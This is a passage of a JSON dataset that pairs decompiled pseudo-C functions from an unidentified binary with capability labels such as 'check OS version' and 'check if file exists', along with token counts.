        "decompiled_code": "\nulong fcn.000326c0(ulong *arg1)\n\n{\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    ulong uVar3;\n    uint8_t auStackX8 [32];\n    \n    fcn.00032650(arg1, auStackX8, 1);\n    do {\n        LOCK();\n        puVar1 = arg1 + 2;\n        uVar2 = *puVar1;\n        *puVar1 = *puVar1 ^ (uVar2 == 0) * *puVar1;\n    } while (uVar2 != 0);\n    *arg1 = 0;\n    uVar3 = arg1[1];\n    arg1[1] = 0;\n    uVar2 = arg1[2];\n    arg1[2] = 0;\n    if (auStackX8[0] < 2) {\n        uVar3 = (*_fcn.000111f0)(uVar2 & 0xffffffffffffff00 | auStackX8[0]);\n    }\n    return uVar3;\n}\n",
        "token_count": 235
    },
    "00034810": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.00034810(ulong arg1, uint32_t *arg2, uint32_t *arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    uint auStackX8 [8];\n    uint32_t in_stack_00000028;\n    ulong in_stack_00000030;\n    uint32_t in_stack_00000038;\n    uint64_t uStack344;\n    ulong uStack336;\n    ulong uStack328;\n    uint uStack320;\n    ulong uStack312;\n    ulong uStack304;\n    ulong uStack296;\n    uint uStack288;\n    uchar auStack280 [4];\n    uint32_t uStack276;\n    ushort auStack248 [2];\n    uint32_t uStack244;\n    uint uStack220;\n    uchar auStack208 [32];\n    uint32_t uStack176;\n    uchar auStack152 [44];\n    int16_t iStack108;\n    uint32_t uStack104;\n    \n    fcn.0006677c(auStack152, 0, 0x68);\n    uStack304 = 0;\n    uStack296 = 0;\n    uStack288 = 0;\n    uStack336 = 0;\n    uStack312 = *arg3 << 0x20;\n    uStack328 = 0;\n    uStack320 = 0;\n    uStack344 = arg1 << 0x20 | 2;\n    uStack312 = CONCAT62(uStack312._2_6_, 2);\n    uVar1 = fcn.00034650(&uStack344, &uStack312, arg2, auStackX8);\n    if (uVar1 == 0) {\n        uVar1 = (**0x7f918)(0, auStackX8[0], 0, &uStack344, 0, auStack152, auStack280);\n        if (uVar1 == 0) {\n            if ((iStack108 != 2) || (uStack104 == 0)) {\n                uStack104 = arg1;\n            }\n            uVar1 = fcn.00032e88(*arg2, arg4, in_stack_00000028);\n            if (uVar1 == 0) {\n                *arg3 = uStack276;\n                fcn.0006677c(auStack248, 0, 0x58);\n                fcn.0006677c(in_stack_00000030, 0, in_stack_00000038);\n                uStack220 = auStackX8[0];\n                auStack248[0] = 2;\n                uStack244 = uStack104;\n                uVar1 = (**0x7f920)(auStack248, auStack280);\n                if (uVar1 == 0) {\n                    if (in_stack_00000038 < uStack176) {\n                        uStack176 = in_stack_00000038;\n                    }\n                    fcn.0006670a(in_stack_00000030, auStack208, uStack176);\n                    uVar1 = 0;\n                }\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 675
    },
    "00038cb0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.00038cb0(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    ulong unaff_RBX;\n    int64_t arg3_00;\n    ulong unaff_RBP;\n    ulong uVar3;\n    ulong unaff_RSI;\n    ulong unaff_RDI;\n    uchar *arg4;\n    ulong unaff_R12;\n    ulong in_stack_00000000;\n    uint32_t in_stack_00000008;\n    uint in_stack_0000000c;\n    ulong in_stack_00000010;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    ulong in_stack_00000078;\n    \n    arg3_00 = 0;\n    if (arg1 == 0) {\n        return 0xc00000ef;\n    }\n    if (arg2 != 0) {\n        if (arg3 == 0) {\n            uVar3 = 0x38664;\n        }\n        else {\n            if (arg3 != 2) {\n                return 0xc00000f1;\n            }\n            uVar3 = 0x38818;\n        }\n        arg4 = &stack0x00000008;\n        uVar1 = fcn.000546e4(arg2, 0x50, 5, arg4);\n        if (uVar1 != 0) {\n            return uVar1;\n        }\n        if (4 < in_stack_00000008) {\n            fcn.00032650(0x800a0, &stack0x00000020, 1);\n            iVar2 = fcn.000384e8(arg1, 1);\n            if (iVar2 != 0) {\n                if (arg3 == 0) {\n                    arg3_00 = iVar2 + 0x10;\n                }\n                else if (arg3 == 2) {\n                    arg3_00 = iVar2 + 0x18;\n                }\n            }\n            fcn.00032684(0x800a0, &stack0x00000020, 1);\n            uVar3 = fcn.000550f0(arg2, uVar3, arg3_00, arg4, unaff_R12, unaff_RDI, unaff_RSI, unaff_RBP, unaff_RBX, \n                                 in_stack_00000000, CONCAT44(in_stack_0000000c, in_stack_00000008), in_stack_00000010, \n                                 in_stack_00000018, in_stack_00000020, in_stack_00000028, in_stack_00000030, \n                                 in_stack_00000038, in_stack_00000040, in_stack_00000048, in_stack_00000050, \n                                 in_stack_00000058, in_stack_00000060, in_stack_00000068, in_stack_00000070, \n                                 in_stack_00000078);\n            return uVar3;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 755
    },
    "000391ac": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t fcn.000391ac(int64_t arg1)\n\n{\n    int64_t arg1_00;\n    int32_t iVar1;\n    ulong *puVar2;\n    uint32_t uVar3;\n    uchar auStackX8 [32];\n    \n    puVar2 = fcn.00030cc4(0x38);\n    if (puVar2 == NULL) {\n        iVar1 = -0x3fffff66;\n    }\n    else {\n        fcn.0006677c(puVar2, 0);\n        puVar2[1] = arg1;\n        puVar2[2] = *(arg1 + 0x20);\n        fcn.00032650(0x800a0, auStackX8, 1);\n        *puVar2 = *0x800b8;\n        *0x800b8 = puVar2;\n        fcn.00032684(0x800a0, auStackX8, 1);\n        uVar3 = 0;\n        do {\n            iVar1 = fcn.000668f0(*(arg1 + 0x10) + 0x38, uVar3 * 0x10 + 0x6a368, 0);\n            if (iVar1 == 0) {\n                return 0;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 2);\n        iVar1 = fcn.00039070(arg1, 4);\n        if ((((iVar1 == 0) && (iVar1 = fcn.00039070(arg1, 3),  iVar1 == 0)) &&\n            (iVar1 = fcn.00039070(arg1, 0),  iVar1 == 0)) && (iVar1 = fcn.00039070(arg1, 2),  iVar1 == 0)) {\n            for (arg1_00 = *(arg1 + 0x18); arg1_00 != 0; arg1_00 = *(arg1_00 + 8)) {\n                iVar1 = fcn.00038a18(arg1_00, *(arg1_00 + 0x18), arg1);\n                if (((iVar1 != 0) || (iVar1 = fcn.00038cb0(arg1_00, *(arg1_00 + 0x1b0), 0),  iVar1 != 0)) ||\n                   (iVar1 = fcn.00038cb0(arg1_00, *(arg1_00 + 0x1b8), 2),  iVar1 != 0)) goto code_r0x000392f9;\n            }\n        }\n        else {\ncode_r0x000392f9:\n            fcn.00038ae4(arg1);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 617
    },
    "0003f5e8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.0003f5e8(ulong arg1, ulong noname_1, ulong arg3)\n\n{\n    ulong uVar1;\n    int16_t in_R9W;\n    ulong *puVar2;\n    uchar auStack56 [16];\n    \n    uVar1 = 0;\n    fcn.00032650(0x80338, auStack56, 0);\n    puVar2 = *0x80350;\n    do {\n        if (puVar2 == NULL) {\ncode_r0x0003f657:\n            fcn.00032684(0x80338, auStack56, 0);\n            return uVar1;\n        }\n        if ((((*(puVar2 + 1) == 2) && (*(puVar2 + 0xc) == arg1)) && (*(puVar2 + 0x8c) == arg3)) &&\n           ((*(puVar2 + 0x21) == noname_1 && (*(puVar2 + 0x10a) == in_R9W)))) {\n            uVar1 = 1;\n            goto code_r0x0003f657;\n        }\n        puVar2 = *puVar2;\n    } while( true );\n}\n",
        "token_count": 267
    },
    "00047238": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t fcn.00047238(ulong noname_0, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    ulong *puVar3;\n    uint32_t uVar4;\n    ulong *puVar5;\n    uint32_t uVar6;\n    \n    uVar2 = 0;\n    uVar4 = arg2;\n    uVar1 = (**0x113f0)(0x8e3c0);\n    uVar6 = 0;\n    puVar5 = *0x80590;\n    do {\n        for (puVar3 = *puVar5; puVar3 != NULL; puVar3 = *puVar3) {\n            if ((((puVar3[6] != 0) && (*(puVar3 + 8) == 2)) && (*(puVar3 + 0x156) == arg3)) &&\n               (*(puVar3 + 0x154) == arg4)) {\n                uVar2 = *(puVar3 + 0x40);\n                goto code_r0x000472aa;\n            }\n        }\n        uVar6 = uVar6 + 1;\n        puVar5 = puVar5 + 1;\n        if (0xfff < uVar6) {\ncode_r0x000472aa:\n            (**0x113e8)(0x8e3c0, uVar4 & 0xffffff00 | uVar1);\n            if (uVar2 == 0) {\n                uVar2 = fcn.000353f0(arg2 & 0xffff);\n            }\n            return uVar2;\n        }\n    } while( true );\n}\n",
        "token_count": 369
    },
    "0004edc4": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0004edc4(ulong arg1, uint64_t *arg2, int64_t *arg3)\n\n{\n    uint64_t uVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint64_t *puVar6;\n    uint64_t uVar7;\n    int64_t aiStackX16 [2];\n    int64_t iStackX32;\n    int64_t iStack432;\n    int64_t iStack424;\n    int64_t iStack416;\n    uchar auStack408 [24];\n    uint uStack384;\n    uint uStack380;\n    uint uStack376;\n    uint16_t uStack372;\n    uint16_t uStack370;\n    uint uStack368;\n    uint16_t uStack364;\n    uint16_t uStack362;\n    uint32_t uStack360;\n    uint uStack356;\n    ushort uStack352;\n    uint uStack340;\n    int32_t iStack328;\n    int32_t iStack324;\n    int32_t iStack320;\n    int32_t iStack316;\n    int32_t iStack312;\n    int32_t iStack308;\n    ulong uStack296;\n    uint32_t uStack284;\n    int64_t iStack272;\n    uchar auStack264 [48];\n    uint64_t uStack216;\n    uint64_t uStack208;\n    uint uStack200;\n    uint16_t uStack192;\n    uint16_t uStack190;\n    int64_t iStack184;\n    uint16_t uStack176;\n    uint16_t uStack174;\n    int64_t iStack168;\n    uint uStack160;\n    ushort uStack156;\n    uint uStack136;\n    uint64_t uStack112;\n    uint64_t uStack104;\n    uint64_t uStack96;\n    uint64_t uStack88;\n    uint64_t uStack80;\n    uint64_t uStack72;\n    \n    iStackX32 = 0;\n    iStack416 = 0;\n    if (arg2 == NULL) {\n        iVar3 = 0x21590066;\n    }\n    else if (arg3 == NULL) {\n        iVar3 = 0x21590067;\n    }\n    else {\n        *arg3 = 0;\n        iVar3 = fcn.0004cf30(&iStackX32, 0x438, arg1);\n        if ((iVar3 == 0) && (iVar3 = fcn.0004cd70(iStackX32, aiStackX16),  iVar3 == 0)) {\n            iVar3 = fcn.0004e2d8(iStackX32, &uStack296);\n            if (iVar3 == 0) {\n                if (aiStackX16[0] == '\\0') {\n                    aiStackX16[0] = 0;\n                    iVar3 = fcn.0004cdbc(iStackX32, uStack296, &uStack296, 0x20);\n                    if (iVar3 == 0) {\n                        if (iStack272 == 0) {\n                            iVar3 = -1;\n                        }\n                        else {\n                            fcn.0006677c(auStack264, 0, 200);\n                            uStack216 = *arg2;\n                            uStack200 = *(arg2 + 1);\n                            uStack136 = *(arg2 + 0xc);\n                            uStack160 = 0x1004;\n                            uStack208 = arg2[2];\n                            uStack156 = 1;\n                            iVar5 = -1;\n                            iVar4 = iVar5;\n                            puVar6 = arg2 + 3;\n                            do {\n                                if (iVar4 == 0) break;\n                                iVar4 = iVar4 + -1;\n                                iVar2 = *puVar6;\n                                puVar6 = puVar6 + 2;\n                            } while (iVar2 != 0);\n                            uStack176 = (~iVar4 - 1) * 2;\n                            if (uStack176 < 2) {\n                                uStack176 = 2;\n                                *(arg2 + 3) = 0;\n                            }\n                            uStack174 = uStack176 + 2;\n                            puVar6 = arg2 + 0x44;\n                            do {\n                                if (iVar5 == 0) break;\n                                iVar5 = iVar5 + -1;\n                                iVar2 = *puVar6;\n                                puVar6 = puVar6 + 2;\n                            } while (iVar2 != 0);\n                            uStack192 = (~iVar5 - 1) * 2;\n                            if (uStack192 < 2) {\n                                uStack192 = 2;\n                                *(arg2 + 3) = 0;\n                            }\n                            uStack190 = uStack192 + 2;\n                            aiStackX16[0] = 0;\n                            iStack424 = uStack190 + 200 + uStack174;\n                            iVar3 = fcn.00066902(iStackX32, aiStackX16, 0, &iStack424, 0x3000, 4);\n                            if (iVar3 == 0) {\n                                iStack416 = aiStackX16[0];\n                                iStack168 = aiStackX16[0] + 200;\n                                iVar3 = fcn.0004cdec(iStackX32, iStack168, arg2 + 3, uStack174);\n                                if (iVar3 == 0) {\n                                    iStack184 = uStack174 + 200 + aiStackX16[0];\n                                    iVar3 = fcn.0004cdec(iStackX32, iStack184, arg2 + 0x44, uStack190);\n                                    if (iVar3 == 0) {\n                                        iVar3 = aiStackX16[0];\n                                        uStack112 = iVar3 + 0x98;\n                                        uStack96 = iVar3 + 0xa8;\n                                        uStack80 = iVar3 + 0xb8;\n                                        uStack104 = uStack112;\n                                        uStack88 = uStack96;\n                                        uStack72 = uStack80;\n                                        iVar3 = fcn.0004cdec(iStackX32, aiStackX16[0], auStack264, 200);\n                                        if (iVar3 == 0) {\n                                            fcn.0004db24(iStackX32, iStack272 + 0x10, aiStackX16[0]);\n                                            fcn.0004db24(iStackX32, iStack272 + 0x20, aiStackX16[0] + 0x10);\n                                            *arg3 = aiStackX16[0];\n                                            iVar3 = 0;\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n                else {\n                    iStack432 = 0;\n                    if (((*arg2 < 0x100000000) && (arg2[2] < 0x100000000)) &&\n                       (iVar3 = fcn.0004cdbc(iStackX32, uStack296, &uStack296, 0x10),  iVar3 == 0)) {\n                        uVar7 = uStack284;\n                        if (uVar7 == 0) {\n                            iVar3 = -1;\n                        }\n                        else {\n                            fcn.0006677c(auStack408, 0, 0x68);\n                            uStack384 = *arg2;\n                            uStack376 = *(arg2 + 1);\n                            uStack340 = *(arg2 + 0xc);\n                            uStack356 = 0x1004;\n                            uStack380 = *(arg2 + 2);\n                            uStack352 = 1;\n                            iVar5 = -1;\n                            iVar4 = iVar5;\n                            puVar6 = arg2 + 3;\n                            do {\n                                if (iVar4 == 0) break;\n                                iVar4 = iVar4 + -1;\n                                iVar2 = *puVar6;\n                                puVar6 = puVar6 + 2;\n                            } while (iVar2 != 0);\n                            uStack364 = (~iVar4 - 1) * 2;\n                            if (uStack364 < 2) {\n                                uStack364 = 2;\n                                *(arg2 + 3) = 0;\n                            }\n                            uStack362 = uStack364 + 2;\n                            puVar6 = arg2 + 0x44;\n                            do {\n                                if (iVar5 == 0) break;\n                                iVar5 = iVar5 + -1;\n                                iVar2 = *puVar6;\n                                puVar6 = puVar6 + 2;\n                            } while (iVar2 != 0);\n                            uStack372 = (~iVar5 - 1) * 2;\n                            if (uStack372 < 2) {\n                                uStack372 = 2;\n                                *(arg2 + 3) = 0;\n                            }\n                            uStack370 = uStack372 + 2;\n                            iStack432 = 0;\n                            iStack424 = uStack370 + 0x68 + uStack362;\n                            iVar3 = fcn.00066902(iStackX32, &iStack432, 0, &iStack424, 0x3000, 4);\n                            if (iVar3 == 0) {\n                                iStack416 = iStack432;\n                                uStack360 = iStack432 + 0x68;\n                                iVar3 = fcn.0004cdec(iStackX32, uStack360, arg2 + 3, uStack362);\n                                if (iVar3 == 0) {\n                                    uVar1 = uStack362 + 0x68 + iStack432;\n                                    uStack368 = uVar1;\n                                    iVar3 = fcn.0004cdec(iStackX32, uVar1 & 0xffffffff, arg2 + 0x44, uStack370);\n                                    if (iVar3 == 0) {\n                                        iStack312 = iStack432;\n                                        iStack328 = iStack312 + 0x50;\n                                        iStack320 = iStack312 + 0x58;\n                                        iStack312 = iStack312 + 0x60;\n                                        iStack324 = iStack328;\n                                        iStack316 = iStack320;\n                                        iStack308 = iStack312;\n                                        iVar3 = fcn.0004cdec(iStackX32, iStack432, auStack408, 0x68);\n                                        if (iVar3 == 0) {\n                                            fcn.0004dc38(iStackX32, uVar7 + 0xc, iStack432);\n                                            fcn.0004dc38(iStackX32, uVar7 + 0x14, iStack432 + 8);\n                                            *arg3 = iStack432;\n                                            iVar3 = 0;\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        if ((iVar3 != 0) && (iStack416 != 0)) {\n            iStack424 = 0;\n            fcn.00066908(iStackX32, &iStack416, &iStack424, 0x8000);\n        }\n        if (iStackX32 != 0) {\n            fcn.000666f2();\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 2444
    },
    "00052d38": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00052d38(int64_t arg1, uint *arg2, ulong arg3)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uchar uVar3;\n    ushort uVar4;\n    uint uVar5;\n    ulong uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint8_t uVar9;\n    char in_R9B;\n    uint8_t uVar10;\n    uint8_t uVar11;\n    uint32_t uVar12;\n    uint8_t uVar13;\n    bool bVar14;\n    uint *in_stack_00000028;\n    uint8_t in_stack_00000030;\n    char in_stack_00000038;\n    \n    fcn.0005247c(arg1);\n    uVar2 = *(*(arg1 + 8) + 0x13a + arg1);\n    uVar12 = 7;\n    uVar9 = uVar2 >> 6;\n    uVar10 = (*(arg1 + 0x129) & 1) << 3 | uVar2 & 7;\n    uVar13 = (*(arg1 + 0x129) & 4) * '\\x02' | uVar2 >> 3 & 7;\n    uVar2 = fcn.00052258(arg1, arg3);\n    iVar7 = 0;\n    iVar8 = 0;\n    *(arg2 + 1) = uVar2;\n    uVar11 = uVar12;\n    if (uVar9 == 3) {\n        *arg2 = 0x8c;\n        if (in_R9B == '\\x01') {\n            iVar7 = fcn.000522d0(arg1, uVar2);\n        }\n        else {\n            uVar2 = (*(arg1 + 0x129) & 4) * '\\x02' | uVar10 & uVar11;\n            if (in_R9B == '\\x02') {\n                iVar7 = (uVar2 & uVar12) + 0x6b;\n            }\n            else if (in_R9B == '\\x03') {\n                iVar7 = uVar2 + 0x4b;\n            }\n            else if (in_R9B == '\\x04') {\n                iVar7 = uVar2 + 0x5b;\n            }\n            else if (in_R9B == '\\x05') {\n                iVar7 = (uVar2 & uVar12) + 0x45;\n            }\n            else if (in_R9B == '\\x06') {\n                iVar7 = uVar2 + 0x7b;\n            }\n        }\n        arg2[4] = iVar7;\n        goto code_r0x000530c3;\n    }\n    *arg2 = 0x8d;\n    if (*(arg1 + 0x134) == '@') {\n        arg2[4] = uVar10 + 0x35;\n        if (uVar9 == 1) {\n            *(arg2 + 6) = 8;\n        }\n        else {\n            if (uVar9 != 2) {\n                if ((uVar9 != 0) || (uVar10 != 5)) {\n                    *(arg2 + 6) = 0;\n                    goto code_r0x00052e8c;\n                }\n                arg2[4] = 0x8b;\n            }\n            *(arg2 + 6) = 0x20;\n        }\ncode_r0x00052e8c:\n        if ((uVar10 & uVar11) != 4) goto code_r0x000530c3;\n        fcn.0005247c(arg1);\n        *(arg2 + 0x19) = '\\x01' << (*(*(arg1 + 8) + 0x13a + arg1) >> 6) & 0xfe;\n        arg2[5] = (*(*(arg1 + 8) + 0x13a + arg1) >> 3 & 7 | (*(arg1 + 0x129) & 2) << 2) + 0x35;\n        iVar7 = (*(*(arg1 + 8) + 0x13a + arg1) & 7 | (*(arg1 + 0x129) & 1) << 3) + 0x35;\n        arg2[4] = iVar7;\n        if (arg2[5] == 0x39) {\n            arg2[5] = 0;\n            *(arg2 + 0x19) = 0;\n        }\n        if (iVar7 != 0x3a) {\n            bVar14 = iVar7 == 0x42;\n            goto code_r0x00052fea;\n        }\n    }\n    else {\n        if (*(arg1 + 0x134) != ' ') {\n            if (uVar10 == 0) {\n                arg2[5] = 0x1b;\ncode_r0x00053084:\n                arg2[4] = 0x18;\n            }\n            else {\n                if (uVar10 == 1) {\n                    arg2[5] = 0x1c;\n                    goto code_r0x00053084;\n                }\n                if (uVar10 == 2) {\n                    arg2[4] = 0x1a;\n                    arg2[5] = 0x1b;\n                }\n                else if (uVar10 == 3) {\n                    arg2[4] = 0x1a;\n                    arg2[5] = 0x1c;\n                }\n                else if (uVar10 == 4) {\n                    arg2[4] = 0x1b;\n                }\n                else if (uVar10 == 5) {\n                    arg2[4] = 0x1c;\n                }\n                else if (uVar10 == 6) {\n                    arg2[4] = 0x1a;\n                }\n                else if (uVar10 == 7) goto code_r0x00053084;\n            }\n            if (uVar9 == 0) {\n                if (uVar10 == 6) {\n                    *(arg2 + 6) = 0x10;\n                }\n            }\n            else if (uVar9 == 1) {\n                *(arg2 + 6) = 8;\n            }\n            else if (uVar9 == 2) {\n                *(arg2 + 6) = 0x10;\n            }\n            goto code_r0x000530c3;\n        }\n        arg2[4] = uVar10 + 0x25;\n        if (uVar9 == 1) {\n            *(arg2 + 6) = 8;\n        }\n        else {\n            if (uVar9 != 2) {\n                if ((uVar9 != 0) || (uVar10 != 5)) {\n                    *(arg2 + 6) = 0;\n                    goto code_r0x00052f66;\n                }\n                arg2[4] = 0;\n            }\n            *(arg2 + 6) = 0x20;\n        }\ncode_r0x00052f66:\n        if ((uVar10 & uVar11) != 4) goto code_r0x000530c3;\n        fcn.0005247c(arg1);\n        *(arg2 + 0x19) = '\\x01' << (*(*(arg1 + 8) + 0x13a + arg1) >> 6) & 0xfe;\n        arg2[5] = (*(*(arg1 + 8) + 0x13a + arg1) >> 3 & 7 | (*(arg1 + 0x129) & 2) << 2) + 0x25;\n        iVar7 = (*(*(arg1 + 8) + 0x13a + arg1) & 7 | (*(arg1 + 0x129) & 1) << 3) + 0x25;\n        arg2[4] = iVar7;\n        if (arg2[5] == 0x29) {\n            arg2[5] = 0;\n            *(arg2 + 0x19) = 0;\n        }\n        bVar14 = iVar7 == 0x2a;\ncode_r0x00052fea:\n        if (!bVar14) goto code_r0x000530c3;\n    }\n    if (uVar9 == 0) {\n        arg2[4] = 0;\n    }\n    uVar3 = 0x20;\n    if (uVar9 == 1) {\n        uVar3 = 8;\n    }\n    *(arg2 + 6) = uVar3;\ncode_r0x000530c3:\n    cVar1 = *(arg2 + 6);\n    if (cVar1 == '\\b') {\n        uVar3 = fcn.0005247c(arg1);\n        *(arg2 + 2) = uVar3;\n    }\n    else if (cVar1 == '\\x10') {\n        uVar4 = fcn.0005250c(arg1);\n        *(arg2 + 2) = uVar4;\n    }\n    else if (cVar1 == ' ') {\n        uVar5 = fcn.00052538(arg1);\n        arg2[2] = uVar5;\n    }\n    else if (cVar1 == '@') {\n        uVar6 = fcn.00052588(arg1);\n        *(arg2 + 2) = uVar6;\n    }\n    if (in_stack_00000028 != NULL) {\n        *in_stack_00000028 = 0x8c;\n        uVar2 = fcn.00052258(arg1, in_stack_00000030);\n        *(in_stack_00000028 + 1) = uVar2;\n        if (in_stack_00000038 == '\\x01') {\n            uVar5 = fcn.000522d0(arg1, uVar2);\n            in_stack_00000028[4] = uVar5;\n        }\n        else {\n            if (in_stack_00000038 == '\\x02') {\n                iVar8 = (uVar13 & 7) + 0x6b;\n            }\n            else if (in_stack_00000038 == '\\x03') {\n                iVar8 = uVar13 + 0x4b;\n            }\n            else if (in_stack_00000038 == '\\x04') {\n                iVar8 = uVar13 + 0x5b;\n            }\n            else if (in_stack_00000038 == '\\x05') {\n                iVar8 = (uVar13 & 7) + 0x45;\n            }\n            else if (in_stack_00000038 == '\\x06') {\n                iVar8 = uVar13 + 0x7b;\n            }\n            in_stack_00000028[4] = iVar8;\n        }\n    }\n    return;\n}\n",
        "token_count": 2412
    },
    "00056a24": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nbool fcn.00056a24(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint16_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int32_t iVar6;\n    \n    iVar5 = 0;\n    iVar4 = arg2;\n    if (0 < iVar4) {\n        iVar6 = 0;\n        do {\n            iVar6 = iVar6 + 1;\n            uVar3 = *(arg1 + iVar5 * 8) & 7;\n            if (uVar3 == 5) {\n                if ((*(arg1 + iVar5 * 8) & 0xf0) == 0) {\n                    iVar2 = iVar6 + *(arg1 + 4 + iVar5 * 8);\n                    iVar1 = iVar2 - arg2;\n                }\n                else {\n                    if (arg2 <= *(arg1 + 2 + iVar5 * 8) + iVar6) {\n                        return false;\n                    }\n                    iVar2 = *(arg1 + 3 + iVar5 * 8) + iVar6;\n                    iVar1 = iVar2 - arg2;\n                }\n                if (SBORROW4(iVar2, arg2) == iVar1 < 0) {\n                    return false;\n                }\n            }\n            if ((((uVar3 == 2) || ((uVar3 == 0 && ((*(arg1 + iVar5 * 8) & 0xe0) == 0x60)))) &&\n                ((0xf < *(arg1 + 4 + iVar5 * 8) || (*(arg1 + 4 + iVar5 * 8) < 0)))) ||\n               ((*(arg1 + iVar5 * 8) == 0x34 && (*(arg1 + 4 + iVar5 * 8) == 0)))) {\n                return false;\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < iVar4);\n    }\n    return (*(arg1 + -8 + iVar4 * 8) & 7) == 6;\n}\n",
        "token_count": 457
    },
    "0005ac60": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0005ac60(ulong arg1, ulong arg2, ulong arg3, uint32_t *arg4)\n\n{\n    uint64_t arg1_00;\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint64_t **in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    ulong uStack104;\n    ulong uStack96;\n    uint uStack88;\n    ulong uStack80;\n    ulong *puStack72;\n    ulong uStack64;\n    \n    uStack104 = 0;\n    iVar1 = fcn.0005a10c(arg1, &uStack104, 0);\n    if (iVar1 == 0) {\n        uStack96._0_4_ = 0;\n        uStack88 = 1;\n        uStack96._4_4_ = arg2;\n        uVar2 = fcn.00030dc8(0);\n        uStack96 = CONCAT44(uStack96._4_4_, uVar2);\n        uVar3 = fcn.00030dc8(uStack96._4_4_);\n        uStack96 = uStack96 & 0xffffffff | uVar3 << 0x20;\n        puStack72 = &uStack96;\n        uStack64 = 0xc;\n        uStack80 = arg3;\n        iVar1 = fcn.00064304(uStack104, &uStack80, in_stack_00000028, in_stack_00000030);\n        if (iVar1 == 0) {\n            if (0xb < *in_stack_00000030) {\n                uStack96 = **in_stack_00000028;\n                uStack88 = *(*in_stack_00000028 + 1);\n                uVar3 = fcn.00030dc8(uStack96 & 0xffffffff);\n                arg1_00 = uStack96 >> 0x20;\n                uStack96 = uStack96 & 0xffffffff00000000 | uVar3;\n                uVar3 = fcn.00030dc8(arg1_00);\n                uStack96 = uStack96 & 0xffffffff | uVar3 << 0x20;\n                if (uStack88 == '\\x02') {\n                    *arg4 = uVar3;\n                    *in_stack_00000030 = *in_stack_00000030 - 0xc;\n                    iVar1 = 0;\n                    if (*in_stack_00000030 < 1) {\n                        fcn.00063bf8(uStack104, *in_stack_00000028);\n                        *in_stack_00000028 = NULL;\n                        *in_stack_00000030 = 0;\n                    }\n                    else {\n                        *in_stack_00000028 = *in_stack_00000028 + 0xc;\n                        *(*in_stack_00000028 + -0xc) = uStack104;\n                    }\n                    goto code_r0x0005adb3;\n                }\n            }\n            fcn.00063bf8(uStack104, *in_stack_00000028);\n            *in_stack_00000028 = NULL;\n            *in_stack_00000030 = 0;\n            iVar1 = 0x2159000a;\n        }\n    }\ncode_r0x0005adb3:\n    